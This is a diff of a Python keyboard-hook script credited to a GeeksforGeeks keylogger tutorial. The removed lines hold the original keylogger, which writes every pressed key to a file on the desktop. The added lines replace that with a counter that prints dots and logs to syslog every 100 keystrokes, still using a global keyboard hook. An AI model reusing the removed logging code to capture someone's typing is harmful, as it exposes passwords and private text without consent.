@@ -1,53 +1,35 @@
 # copied from https://www.geeksforgeeks.org/design-a-keylogger-in-python/
-
-
-# Python code for keylogger
-# to be used in linux
 import os
 import pyxhook
+import syslog
 
-# This tells the keylogger where the log file will go.
-# You can set the file path as an environment variable ('pylogger_file'),
-# or use the default ~/Desktop/file.log
-log_file = os.environ.get(
-	'pylogger_file',
-	os.path.expanduser('~/Desktop/file.log')
-)
-# Allow setting the cancel key from environment args, Default: `
-cancel_key = ord(
-	os.environ.get(
-		'pylogger_cancel',
-		'`'
-	)[0]
-)
-
-# Allow clearing the log file on start, if pylogger_clean is defined.
-if os.environ.get('pylogger_clean', None) is not None:
-	try:
-		os.remove(log_file)
-	except EnvironmentError:
-	# File does not exist, or no permissions.
-		pass
+count = 0
 
 #creating key pressing event and saving it into log file
 def OnKeyPress(event):
-	with open(log_file, 'a') as f:
-		f.write('{}\n'.format(event.Key))
+    global count
+    count += 1
+    print(".",end='',flush=True)
+    if count == 100:
+        print("100!",flush=True)
+        syslog.syslog("Got 100 keystrokes.")
+        count = 0
 
 # create a hook manager object
+print("Running.")
 new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress
 # set the hook
 new_hook.HookKeyboard()
+print("Things are set up.")
 try:
-	new_hook.start()		 # start the hook
+    print("In the try loop")
+    new_hook.start()		 # start the hook
+    print("Past hook,start()")
 except KeyboardInterrupt:
 	# User cancelled from command line.
-	pass
+    pass
 except Exception as ex:
-	# Write exceptions to the log file, for analysis later.
-	msg = 'Error while catching events:\n {}'.format(ex)
-	pyxhook.print_err(msg)
-	with open(log_file, 'a') as f:
-		f.write('\n{}'.format(msg))
+    msg = 'Error while catching events: {}'.format(ex)
+    syslog.syslog(msg)
 
